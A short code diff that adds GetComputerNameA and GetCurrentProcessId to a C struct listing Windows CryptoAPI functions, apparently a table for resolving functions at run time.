@@ -51,9 +51,11 @@ typedef struct
 		FUNC( CryptCreateHash );
 		FUNC( CryptDestroyKey );
 		FUNC( CryptDestroyHash );
+		FUNC( GetComputerNameA );
 		FUNC( CryptSetKeyParam );
 		FUNC( CryptGetHashParam );
 		FUNC( CryptDecodeObjectEx );
+		FUNC( GetCurrentProcessId );
 		FUNC( CryptReleaseContext );
 		FUNC( CryptAcquireContextA );
 		FUNC( CryptImportPublicKeyInfo );
